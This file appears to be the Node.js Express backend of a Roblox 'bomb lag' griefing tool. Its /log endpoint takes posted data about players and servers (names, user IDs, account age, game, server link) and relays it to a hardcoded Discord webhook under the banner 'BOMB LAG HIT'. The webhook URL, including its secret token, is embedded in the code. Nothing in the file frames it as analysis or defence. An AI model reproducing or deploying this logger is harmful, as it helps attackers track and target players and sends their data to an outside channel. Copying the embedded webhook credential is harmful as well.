const express = require("express");

const app = express();
app.use(express.json());

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457116012490264626/uKtDP7Ru3QvqrBFz-klP2IFCcHn3LZ2u1PQ8BOLYAO_uHiRBNMLlPLovc-CbNbcgYS9j";

app.post("/log", async (req, res) => {
  try {
    const data = req.body;

    console.log("📥 DATA RECIBIDA:", data);

    const payload = {
      content: "🔥 **BOMB LAG HIT**",
      embeds: [
        {
          title: "📡 New Roblox Server Link Logged",
          color: 0xff4c4c,
          fields: [
            { name: "👤 Player", value: String(data.playerName), inline: true },
            { name: "🆔 UserId", value: String(data.userId), inline: true },
            { name: "📆 Account Age", value: `${data.accountAge} days`, inline: true },
            { name: "🎮 Game", value: data.gameName || "Unknown", inline: false },
            { name: "🔗 Server Link", value: data.serverLink, inline: false },
            { name: "⏰ Time", value: `<t:${data.time}:F>`, inline: false }
          ]
        }
      ]
    };

    const response = await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "BombLag-Backend/1.0"
      },
      body: JSON.stringify(payload)
    });

    console.log("📡 Discord status:", response.status);

    if (!response.ok) {
      const text = await response.text();
      console.error("❌ Discord error:", text);
      return res.status(500).json({ error: "Discord rejected webhook" });
    }

    console.log("✅ Webhook SENT");
    res.json({ success: true });

  } catch (err) {
    console.error("❌ BACKEND ERROR:", err);
    res.status(500).json({ error: "Internal error" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("🚀 Backend running on port", PORT);
});

